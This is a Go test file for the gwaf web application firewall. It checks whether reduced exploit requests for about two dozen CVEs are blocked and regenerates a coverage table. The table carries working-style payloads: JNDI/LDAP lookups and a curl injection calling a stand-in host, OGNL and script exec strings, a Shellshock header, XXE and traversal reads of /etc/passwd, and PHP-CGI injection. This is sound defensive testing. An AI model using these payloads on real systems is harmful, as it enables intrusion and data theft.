// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.

package gwaf_test

import (
	"encoding/base64"
	"flag"
	"fmt"
	"os"
	"sort"
	"strings"
	"testing"

	"github.com/gsoultan/gwaf"
	"github.com/gsoultan/gwaf/ruleset/leaks"
	"github.com/gsoultan/gwaf/ruleset/signatures"
)

// The CVE drill answers one question in minutes instead of a review: is a CVE
// that was just published already covered?
//
// Each entry is the request a public exploit sends, reduced to the part that
// carries the attack, and a benign neighbour on the same target that must still
// pass. The drill runs it twice: against core alone, and against core with the
// opt-in bundles an embedder such as gateon loads. That separates the two kinds
// of coverage worth telling apart:
//
//   - structural: core's detectors refuse it without a rule naming the CVE.
//     This is the coverage that also holds for the next CVE of the same shape.
//   - named: only a bundle rule refuses it, typically one written for the CVE.
//   - gap: nothing refuses it, and the note says why and what would.
//   - embedder: the defect is one gwaf's scope line gives to the embedder
//     (a header the edge must strip, a socket, an encrypted protocol), and the
//     note names where it is handled. The request is still run, so an entry
//     that gwaf starts catching is noticed.
//
// Adding a CVE is a table entry. The test fails when an entry's coverage
// changes in either direction, so a regression and a gap that quietly closed
// are both seen, and docs/CVE-COVERAGE.md is regenerated with -update-cve-doc.

var updateCVEDoc = flag.Bool("update-cve-doc", false, "rewrite docs/CVE-COVERAGE.md from the CVE drill")

type coverage string

const (
	covStructural coverage = "structural"
	covNamed      coverage = "named"
	covGap        coverage = "gap"
	covEmbedder   coverage = "embedder"
)

type drillReq struct {
	method, target string
	headers        [][2]string
	ct             string
	body           string
}

type cveCase struct {
	cve, name string
	attack    drillReq
	benign    drillReq
	want      coverage
	note      string
}

var cveDrill = []cveCase{
	{
		cve: "CVE-2021-44228", name: "Log4Shell JNDI lookup in a header",
		attack: drillReq{method: "GET", target: "/", headers: [][2]string{{"X-Api-Version", "${jndi:ldap://203.0.113.7/a}"}}},
		benign: drillReq{method: "GET", target: "/", headers: [][2]string{{"X-Api-Version", "2.17.1"}}},
		want:   covStructural,
	},
	{
		cve: "CVE-2021-44228", name: "Log4Shell with nested lookups",
		attack: drillReq{method: "GET", target: "/?q=${${lower:j}${lower:n}di:ldap://203.0.113.7/a}"},
		benign: drillReq{method: "GET", target: "/?q=${user.name}"},
		want:   covStructural,
	},
	{
		cve: "CVE-2022-42889", name: "Text4Shell script interpolation",
		attack: drillReq{method: "GET", target: "/?q=${script:javascript:java.lang.Runtime.getRuntime().exec('id')}"},
		benign: drillReq{method: "GET", target: "/?q=javascript+tutorial"},
		want:   covStructural,
	},
	{
		cve: "CVE-2022-22965", name: "Spring4Shell class loader binding",
		attack: drillReq{method: "POST", target: "/", ct: "application/x-www-form-urlencoded",
			body: "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di"},
		benign: drillReq{method: "POST", target: "/", ct: "application/x-www-form-urlencoded", body: "class=economy&module=3"},
		want:   covStructural,
	},
	{
		cve: "CVE-2014-6271", name: "Shellshock function definition in User-Agent",
		attack: drillReq{method: "GET", target: "/cgi-bin/status", headers: [][2]string{{"User-Agent", "() { :; }; /bin/bash -c 'id'"}}},
		benign: drillReq{method: "GET", target: "/cgi-bin/status", headers: [][2]string{{"User-Agent", "Mozilla/5.0 (X11; Linux x86_64)"}}},
		want:   covStructural,
	},
	{
		cve: "CVE-2017-5638", name: "Struts2 OGNL in Content-Type",
		attack: drillReq{method: "POST", target: "/upload.action",
			headers: [][2]string{{"Content-Type", "%{(#_='multipart/form-data').(#cmd='id').(@java.lang.Runtime@getRuntime().exec(#cmd))}"}}},
		benign: drillReq{method: "POST", target: "/upload.action", ct: "multipart/form-data; boundary=x", body: "--x--\r\n"},
		want:   covStructural,
	},
	{
		cve: "CVE-2022-26134", name: "Confluence OGNL in the path",
		attack: drillReq{method: "GET", target: "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/"},
		benign: drillReq{method: "GET", target: "/display/ENG/Runbook"},
		want:   covStructural,
	},
	{
		cve: "CVE-2021-41773", name: "Apache dot-dot traversal to /etc/passwd",
		attack: drillReq{method: "GET", target: "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"},
		benign: drillReq{method: "GET", target: "/cgi-bin/status"},
		want:   covStructural,
	},
	{
		cve: "CVE-2019-19781", name: "Citrix ADC traversal to vpns",
		attack: drillReq{method: "GET", target: "/vpn/../vpns/cfg/smb.conf"},
		benign: drillReq{method: "GET", target: "/vpn/index.html"},
		want:   covGap,
		note:   "One ../ that stays inside the tree is ordinary, and nothing marks /vpns/ or smb.conf as sensitive. An embedder that normalises the path forwards /vpns/cfg/smb.conf, which is the target anyway.",
	},
	{
		cve: "CVE-2024-4577", name: "PHP-CGI argument injection with a soft hyphen",
		attack: drillReq{method: "POST", target: "/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
			ct: "application/x-www-form-urlencoded", body: "<?php system('id'); ?>"},
		benign: drillReq{method: "GET", target: "/index.php?page=about"},
		want:   covStructural,
	},
	{
		cve: "CVE-2024-3400", name: "PAN-OS command injection in a session cookie",
		attack: drillReq{method: "GET", target: "/global-protect/login.esp",
			headers: [][2]string{{"Cookie", "SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/aaa`curl${IFS}203.0.113.7`"}}},
		benign: drillReq{method: "GET", target: "/global-protect/login.esp", headers: [][2]string{{"Cookie", "SESSID=7f3c9a1e"}}},
		want:   covStructural,
	},
	{
		cve: "CVE-2023-34362", name: "MOVEit Transfer SQL injection header",
		attack: drillReq{method: "POST", target: "/moveitisapi/moveitisapi.dll?action=m2",
			headers: [][2]string{{"X-siLock-Transaction", "folder_add_by_path"}, {"X-siLock-SessVar0", "MyUsername: Guest"}}},
		benign: drillReq{method: "GET", target: "/human.aspx"},
		want:   covNamed,
	},
	{
		cve: "CVE-2025-29927", name: "Next.js middleware bypass header",
		attack: drillReq{method: "GET", target: "/admin",
			headers: [][2]string{{"x-middleware-subrequest", "middleware:middleware:middleware:middleware:middleware"}}},
		benign: drillReq{method: "GET", target: "/admin"},
		want:   covEmbedder,
		note:   "The header is harmless text; the defect is a framework trusting it from a client. The edge must strip it (gateon: framework-internal headers are stripped at the entrypoint).",
	},
	// ---- 2026-11-28 round: KEV additions and exploited CVEs, 2026-10-20..11-28.
	{
		cve: "CVE-2026-35273", name: "PeopleSoft PSEMHUB raw Java object stream behind an encoded path",
		attack: drillReq{method: "POST", target: "/%50SEMHUB/hub", ct: "application/octet-stream", body: string(javaStream)},
		benign: drillReq{method: "POST", target: "/PSEMHUB/hub", ct: "application/octet-stream", body: "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x10"},
		want:   covStructural,
	},
	{
		cve: "CVE-2026-131914", name: "Idunno.AntiCsrf ObjectStateFormatter gadget in the CSRF form field",
		attack: drillReq{method: "POST", target: "/Default.aspx", ct: "application/x-www-form-urlencoded",
			headers: [][2]string{{"Cookie", "__CSRFCOOKIE=1"}},
			body:    formBody("__CSRFTOKEN", viewStateGadget())},
		benign: drillReq{method: "POST", target: "/Default.aspx", ct: "application/x-www-form-urlencoded",
			body: formBody("__VIEWSTATE", viewStateBenign(), "__VIEWSTATEGENERATOR", "CA0B0334")},
		want: covStructural,
	},
	{
		cve: "CVE-2025-42884", name: "SAP NetWeaver Portal JNDI environment in a SOAP list call",
		attack: drillReq{method: "POST", target: "/DefaultService_PcmSi/", ct: "text/xml; charset=utf-8",
			body: `<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><ns:list>` +
				`<ns:EnvironmentElement><ns:name>java.naming.factory.initial</ns:name><ns:value>com.sun.jndi.ldap.LdapCtxFactory</ns:value></ns:EnvironmentElement>` +
				`<ns:EnvironmentElement><ns:name>java.naming.provider.url</ns:name><ns:value>ldap://203.0.113.7:1389/a</ns:value></ns:EnvironmentElement>` +
				`</ns:list></soapenv:Body></soapenv:Envelope>`},
		benign: drillReq{method: "POST", target: "/DefaultService_PcmSi/", ct: "text/xml; charset=utf-8",
			body: `<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><ns:list>` +
				`<ns:EnvironmentElement><ns:name>locale</ns:name><ns:value>en_US</ns:value></ns:EnvironmentElement></ns:list></soapenv:Body></soapenv:Envelope>`},
		want: covStructural,
	},
	{
		cve: "CVE-2026-129448", name: "Apache Roller XML-RPC serializable extension type",
		attack: drillReq{method: "POST", target: "/roller-services/xmlrpc", ct: "text/xml",
			body: `<?xml version="1.0"?><methodCall><methodName>metaWeblog.getPost</methodName><params><param><value>` +
				`<ex:serializable xmlns:ex="http://ws.apache.org/xmlrpc/namespaces/extensions">` +
				base64.StdEncoding.EncodeToString(javaStream) + `</ex:serializable></value></param></params></methodCall>`},
		benign: drillReq{method: "POST", target: "/roller-services/xmlrpc", ct: "text/xml",
			body: `<?xml version="1.0"?><methodCall><methodName>metaWeblog.getPost</methodName><params><param><value><string>42</string></value></param></params></methodCall>`},
		want: covStructural,
	},
	{
		cve: "CVE-2026-20320", name: "Cisco BroadWorks OCI-P blind out-of-band XXE",
		attack: drillReq{method: "POST", target: "/webservice/services/ProvisioningService", ct: "text/xml",
			body: `<?xml version="1.0"?><!DOCTYPE m [<!ENTITY % p SYSTEM "http://203.0.113.7/x.dtd"> %p;]><BroadsoftDocument protocol="OCI"><sessionId>a</sessionId></BroadsoftDocument>`},
		benign: drillReq{method: "POST", target: "/webservice/services/ProvisioningService", ct: "text/xml",
			body: `<?xml version="1.0"?><BroadsoftDocument protocol="OCI"><sessionId>a</sessionId></BroadsoftDocument>`},
		want: covStructural,
	},
	{
		cve: "CVE-2026-120705", name: "GeoServer WFS stored query external entity",
		attack: drillReq{method: "POST", target: "/geoserver/wfs", ct: "application/xml",
			body: `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><wfs:GetFeature service="WFS" version="2.0.0" xmlns:wfs="http://www.opengis.net/wfs/2.0"><wfs:StoredQuery id="&x;"/></wfs:GetFeature>`},
		benign: drillReq{method: "POST", target: "/geoserver/wfs", ct: "application/xml",
			body: `<?xml version="1.0"?><wfs:GetFeature service="WFS" version="2.0.0" xmlns:wfs="http://www.opengis.net/wfs/2.0"><wfs:StoredQuery id="urn:ogc:def:query:OGC-WFS::GetFeatureById"/></wfs:GetFeature>`},
		want: covStructural,
	},
	{
		cve: "CVE-2026-129243", name: "GeoServer prefixed service name past the service-security check",
		attack: drillReq{method: "GET", target: "/geoserver/ows?service=x/WFS&version=2.0.0&request=CreateStoredQuery"},
		benign: drillReq{method: "GET", target: "/geoserver/ows?service=WFS&version=2.0.0&request=GetCapabilities"},
		want:   covNamed,
	},
	{
		cve: "CVE-2026-102895", name: "GPUStack loopback identity from a client header",
		attack: drillReq{method: "GET", target: "/v2/users", headers: [][2]string{{"X-GPUStack-Real-IP", "127.0.0.1"}}},
		benign: drillReq{method: "GET", target: "/v2/users"},
		want:   covEmbedder,
		note:   "The header is a well-formed address; the defect is GPUStack believing a client about where the client is. The edge must strip it. gateon strips its framework-internal list and resolves the client address itself, but forwards this vendor header today.",
	},
	{
		cve: "CVE-2026-132165", name: "Drupal reinstall through install.php",
		attack: drillReq{method: "POST", target: "/core/install.php?rewrite=ok&langcode=en&profile=standard",
			ct: "application/x-www-form-urlencoded", body: "form_id=install_settings_form&driver=sqlite"},
		benign: drillReq{method: "GET", target: "/node/1"},
		want:   covEmbedder,
		note:   "The request is the installer's own form, byte for byte; whether a deployed site may still be installed is policy. Deny /core/install.php at the edge on a site that is already installed.",
	},
	{
		cve: "CVE-2026-119618", name: "Apache mod_http2 header-assignment race",
		attack: drillReq{method: "GET", target: "/"},
		benign: drillReq{method: "GET", target: "/"},
		want:   covEmbedder,
		note:   "A race in the origin's HTTP/2 frame handling; no request content carries it. A gateway that terminates HTTP/2 and re-originates the request (gateon does) keeps client frames from reaching the origin.",
	},
	{
		cve: "CVE-2026-123007", name: "NGINX HTTP/2 flow-control window underflow",
		attack: drillReq{method: "GET", target: "/"},
		benign: drillReq{method: "GET", target: "/"},
		want:   covEmbedder,
		note:   "SETTINGS, WINDOW_UPDATE and stream cancellation, all below the request; no request content carries it. A gateway that terminates HTTP/2 and re-originates the request (gateon does) keeps client frames from reaching the origin.",
	},
	{
		cve: "CVE-2026-98432", name: "Kernel TCP handshake use-after-free via SYN IP options",
		attack: drillReq{method: "GET", target: "/"},
		benign: drillReq{method: "GET", target: "/"},
		want:   covEmbedder,
		note:   "Fires before accept(); no request exists. gateon ADR 0083 drops SYNs carrying IP options in XDP/TC.",
	},
	{
		cve: "CVE-2026-123158", name: "OpenSSH long-password bypass",
		attack: drillReq{method: "GET", target: "/"},
		benign: drillReq{method: "GET", target: "/"},
		want:   covEmbedder,
		note:   "Inside the encrypted SSH session; no HTTP request exists. gateon ADR 0084 enforces IP filters on SSH routes.",
	},
}

func drillWAFs(t *testing.T) (core, full *gwaf.WAF) {
	t.Helper()
	core, err := gwaf.New()
	if err != nil {
		t.Fatal(err)
	}
	full, err = gwaf.New(gwaf.WithRuleset(append(signatures.All(), leaks.All()...)))
	if err != nil {
		t.Fatal(err)
	}
	return core, full
}

func drillBlocked(w *gwaf.WAF, r drillReq) bool {
	tx := w.NewTransaction()
	defer tx.Close()
	tx.SetRemoteAddr("192.0.2.10")
	tx.SetRequestLine(r.method, r.target, "HTTP/1.1")
	for _, h := range r.headers {
		tx.AddRequestHeader(h[0], h[1])
	}
	if r.ct != "" {
		tx.AddRequestHeader("Content-Type", r.ct)
	}
	if tx.ProcessRequestHeaders().Blocked() {
		return true
	}
	if r.body != "" {
		tx.SetRequestBody([]byte(r.body))
	}
	return tx.ProcessRequestBody().Blocked()
}

func classify(core, full bool) coverage {
	switch {
	case core:
		return covStructural
	case full:
		return covNamed
	default:
		return covGap
	}
}

func TestCVEDrill(t *testing.T) {
	core, full := drillWAFs(t)
	seen := map[string]bool{}
	for _, c := range cveDrill {
		if seen[c.cve+c.name] {
			t.Errorf("%s %q appears twice", c.cve, c.name)
		}
		seen[c.cve+c.name] = true
		got := classify(drillBlocked(core, c.attack), drillBlocked(full, c.attack))
		want := c.want
		if want == covEmbedder {
			if got != covGap {
				t.Errorf("%s (%s): marked embedder but gwaf now refuses it (%s); reclassify", c.cve, c.name, got)
			}
		} else if got != want {
			t.Errorf("%s (%s): coverage is %s, the drill records %s", c.cve, c.name, got, want)
		}
		if (want == covGap || want == covEmbedder) && c.note == "" {
			t.Errorf("%s (%s): a %s entry must say why and where it is handled", c.cve, c.name, want)
		}
		if drillBlocked(full, c.benign) {
			t.Errorf("%s (%s): the benign neighbour is refused", c.cve, c.name)
		}
	}
	doc := renderCVEDoc()
	const path = "docs/CVE-COVERAGE.md"
	if *updateCVEDoc {
		if err := os.WriteFile(path, []byte(doc), 0o644); err != nil {
			t.Fatal(err)
		}
		return
	}
	cur, err := os.ReadFile(path)
	// A Windows checkout rewrites the file's line endings (core.autocrlf), and
	// the comparison is about the table, so the endings are folded first.
	if err != nil || strings.ReplaceAll(string(cur), "\r\n", "\n") != doc {
		t.Errorf("%s is out of date; run go test -run TestCVEDrill -update-cve-doc .", path)
	}
}

func renderCVEDoc() string {
	cases := append([]cveCase(nil), cveDrill...)
	sort.SliceStable(cases, func(i, j int) bool { return cases[i].cve < cases[j].cve })
	counts := map[coverage]int{}
	var b strings.Builder
	b.WriteString("# CVE coverage\n\n")
	b.WriteString("Generated by `TestCVEDrill` (`cve_drill_test.go`). Do not edit by hand:\n")
	b.WriteString("add an entry to the drill and run `go test -run TestCVEDrill -update-cve-doc .`\n\n")
	b.WriteString("- **structural**: core refuses it with no rule naming the CVE, so the next CVE of the same shape is covered too.\n")
	b.WriteString("- **named**: only an opt-in bundle rule (`ruleset/signatures`, `ruleset/leaks`) refuses it.\n")
	b.WriteString("- **gap**: nothing refuses it yet; the note says why.\n")
	b.WriteString("- **embedder**: outside gwaf's scope line (CLAUDE.md §1); the note says where it is handled.\n\n")
	b.WriteString("| CVE | Exploit | Coverage | Note |\n|---|---|---|---|\n")
	for _, c := range cases {
		counts[c.want]++
		fmt.Fprintf(&b, "| %s | %s | %s | %s |\n", c.cve, c.name, c.want, c.note)
	}
	fmt.Fprintf(&b, "\n%d entries: %d structural, %d named, %d gap, %d embedder.\n",
		len(cases), counts[covStructural], counts[covNamed], counts[covGap], counts[covEmbedder])
	return b.String()
}
